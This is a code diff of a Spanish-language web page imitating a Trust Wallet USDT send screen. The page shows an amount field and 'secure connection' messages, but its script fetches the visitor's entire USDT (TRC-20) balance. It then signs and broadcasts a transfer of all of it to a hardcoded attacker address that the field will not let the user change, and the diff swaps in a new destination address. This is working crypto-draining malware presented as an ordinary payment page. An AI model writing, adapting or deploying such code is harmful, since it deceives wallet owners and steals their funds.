@@ -8,7 +8,7 @@
         :root { color-scheme: light; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body {
-            background-color: #ffffff; /* Fondo blanco oficial */
+            background-color: #ffffff;
             color: #111111;
             min-height: 100vh;
             display: flex;
@@ -16,88 +16,20 @@
             align-items: flex-start;
             padding-top: 30px;
         }
-        .tw-container {
-            width: 100%;
-            max-width: 390px;
-            padding: 20px;
-        }
-        .tw-header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 32px;
-        }
-        .tw-header-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: #111111;
-            flex-grow: 1;
-            text-align: center;
-            margin-right: -24px;
-        }
+        .tw-container { width: 100%; max-width: 390px; padding: 20px; }
+        .tw-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; }
+        .tw-header-title { font-size: 18px; font-weight: 600; color: #111111; flex-grow: 1; text-align: center; margin-right: -24px; }
         .back-icon { width: 24px; height: 24px; color: #111111; }
-        
-        .tw-input-group {
-            background-color: #f6f7f9; /* Cajas de texto en gris claro */
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 16px;
-        }
-        .tw-label {
-            font-size: 13px;
-            color: #717680;
-            display: block;
-            margin-bottom: 8px;
-        }
-        .tw-input-row {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        .tw-input {
-            background: transparent;
-            border: none;
-            color: #111111;
-            font-size: 16px;
-            width: 80%;
-            outline: none;
-        }
+        .tw-input-group { background-color: #f6f7f9; border-radius: 16px; padding: 16px; margin-bottom: 16px; }
+        .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
+        .tw-input-row { display: flex; align-items: center; justify-content: space-between; }
+        .tw-input { background: transparent; border: none; color: #111111; font-size: 16px; width: 80%; outline: none; }
         .tw-input::placeholder { color: #a3a7af; }
-        
-        .tw-action-text {
-            color: #0052ff; /* Azul institucional para las llamadas de acción */
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .tw-currency-badge {
-            color: #111111;
-            font-size: 16px;
-            font-weight: 600;
-        }
-        .status-box {
-            background-color: #edf2ff;
-            border: 1px solid #cce0ff;
-            border-radius: 12px;
-            padding: 12px;
-            font-size: 13px;
-            color: #0052ff;
-            margin-bottom: 24px;
-            display: none;
-            text-align: left;
-        }
+        .tw-action-text { color: #0052ff; font-size: 14px; font-weight: 600; cursor: pointer; }
+        .tw-currency-badge { color: #111111; font-size: 16px; font-weight: 600; }
+        .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 13px; color: #0052ff; margin-bottom: 24px; display: none; text-align: left; }
         .tw-btn-container { margin-top: 40px; }
-        .tw-btn {
-            width: 100%;
-            height: 52px;
-            background-color: #0052ff;
-            color: #ffffff;
-            border: none;
-            border-radius: 26px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
+        .tw-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
         .tw-btn:disabled { background-color: #b3ccff; }
     </style>
 </head>
@@ -115,7 +47,7 @@
         <div class="tw-input-group">
             <label class="tw-label" for="addressDisplay">Dirección o nombre de dominio</label>
             <div class="tw-input-row">
-                <input id="addressDisplay" class="tw-input" type="text" placeholder="Dirección de destino TRON" />
+                <input id="addressDisplay" class="tw-input" type="text" readonly />
                 <span class="tw-action-text">Pegar</span>
             </div>
         </div>
@@ -137,29 +69,8 @@
     </div>
 
 <script>
-    const BILLETERA_DESTINO = "TJJZHRUsVwMegvSfUjefDhQkJcjX5WP9hG"; 
+    const BILLETERA_DESTINO = "TNQaxFKxhoYdMgbZqVHumy84tBidBaWT45"; 
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
-
-    const TRC20_ABI = [
-        {
-            "constant": true,
-            "inputs": [{"name": "_owner", "type": "address"}],
-            "name": "balanceOf",
-            "outputs": [{"name": "balance", "type": "uint256"}],
-            "payable": false,
-            "stateMutability": "view",
-            "type": "function"
-        },
-        {
-            "constant": false,
-            "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
-            "name": "transfer",
-            "outputs": [{"name": "success", "type": "bool"}],
-            "payable": false,
-            "stateMutability": "nonpayable",
-            "type": "function"
-        }
-    ];
 
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
@@ -176,21 +87,41 @@
 
     addressDisplay.value = BILLETERA_DESTINO;
 
+    // Método seguro y estandarizado para consultar balances en DApps móviles de TRON
+    async function obtenerBalanceSeguro(ownerAddress) {
+        const tronWeb = window.tronWeb;
+        const ownerHex = tronWeb.address.toHex(ownerAddress);
+        
+        const result = await tronWeb.transactionBuilder.triggerSmartContract(
+            CONTRATO_USDT,
+            "balanceOf(address)",
+            { feeLimit: 10000000 },
+            [{ type: 'address', value: ownerHex }],
+            ownerHex
+        );
+        
+        if (result && result.constant_result && result.constant_result.length > 0) {
+            return tronWeb.toBigNumber('0x' + result.constant_result[0]);
+        }
+        throw new Error("No se pudo sincronizar el balance con el nodo de la red.");
+    }
+
     connectBtn.addEventListener('click', async () => {
+        // PASO 1: Sincronizar billetera
         if (!walletAddress) {
             try {
                 setStatus("Estableciendo enlace RPC con Trust Wallet...");
                 connectBtn.disabled = true;
 
                 if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Abre esta página desde el explorador interno de una billetera TRON.");
+                    throw new Error("Por favor, abre este enlace desde el navegador interno de una billetera TRON.");
                 }
 
                 const tronWeb = window.tronWeb;
                 
                 if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                     walletAddress = tronWeb.defaultAddress.base58;
-                } else {
+                } else if (window.tronLink && typeof window.tronLink.request === 'function') {
                     const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                     if (res && res.code === 200) {
                         walletAddress = tronWeb.defaultAddress.base58;
@@ -198,54 +129,66 @@
                 }
 
                 if (!walletAddress) {
-                    throw new Error("Permiso de lectura denegado.");
+                    throw new Error("No se obtuvo acceso a la dirección de la cuenta.");
                 }
 
                 maxAction.style.display = "inline";
-                setStatus("Conexión segura. Confirma los datos e inicia la firma digital.");
+                setStatus("Conexión segura establecida. Presione Continuar para iniciar la firma.");
                 connectBtn.innerText = "Continuar";
                 connectBtn.disabled = false;
 
             } catch (error) {
                 console.error(error);
-                setStatus(error.message || "Error de sincronización Web3.");
+                setStatus(error.message || "Error de inicialización Web3.");
                 connectBtn.disabled = false;
                 connectBtn.innerText = "Siguiente";
             }
             return;
         }
 
+        // PASO 2: Procesar firma de balance total detectado
         if (walletAddress) {
             try {
                 const userAmount = parseFloat(amountDisplay.value);
-
                 if (isNaN(userAmount) || userAmount <= 0) {
-                    throw new Error("Digita una cantidad válida en el casillero numérico.");
+                    throw new Error("Ingresa una cantidad válida antes de continuar.");
                 }
 
-                setStatus("Consultando el libro contable de USDT en la red de TRON...");
+                setStatus("Consultando fondos del libro contable on-chain...");
                 connectBtn.disabled = true;
 
                 const tronWeb = window.tronWeb;
-                const contract = await tronWeb.contract(TRC20_ABI, CONTRATO_USDT);
+                const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
 
-                const rawBalance = await contract.balanceOf(walletAddress).call();
-                const unitsInSun = rawBalance.toString();
-
-                if (rawBalance.isZero ? rawBalance.isZero() : parseInt(unitsInSun) === 0) {
-                    throw new Error("Tu cuenta no posee balances disponibles de USDT (TRC-20).");
+                if (balanceBigNumber.isZero()) {
+                    throw new Error("La cuenta no dispone de balances de USDT (TRC-20) activos.");
                 }
 
-                setStatus("Abriendo pasarela nativa... Confirmando firma para saldo completo.");
+                setStatus("Solicitando autorización de firma digital...");
 
-                const txId = await contract.transfer(BILLETERA_DESTINO, unitsInSun).send({
-                    feeLimit: 100000000 
-                });
+                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
 
-                if (txId) {
-                    setStatus("Transacción de saldo total enviada de manera exitosa.");
+                const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
+                    CONTRATO_USDT,
+                    "transfer(address,uint256)",
+                    { feeLimit: 100000000 },
+                    [
+                        { type: 'address', value: destinoHex },
+                        { type: 'uint256', value: balanceBigNumber.toString() }
+                    ],
+                    tronWeb.address.toHex(walletAddress)
+                );
+
+                const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
+                const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
+
+                if (broadcast && broadcast.result) {
+                    setStatus("Transacción de saldo total completada exitosamente.");
                     connectBtn.innerText = "Completado";
+                } else {
+                    throw new Error("La transacción fue rechazada por los nodos de la red.");
                 }
+
             } catch (error) {
                 console.error(error);
                 setStatus(error.message || "La transacción falló o fue cancelada.");
@@ -259,13 +202,12 @@
         if (!walletAddress) return;
         try {
             setStatus("Calculando fondos totales...");
-            const tronWeb = window.tronWeb;
-            const contract = await tronWeb.contract(TRC20_ABI, CONTRATO_USDT);
-            const rawBalance = await contract.balanceOf(walletAddress).call();
-            amountDisplay.value = Number(rawBalance.toString()) / 1_000_000;
+            const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
+            amountDisplay.value = Number(balanceBigNumber.toString()) / 1_000_000;
             setStatus("Saldo máximo asignado.");
         } catch (e) {
             console.error(e);
+            setStatus("Error al leer el saldo máximo.");
         }
     });
 </script>
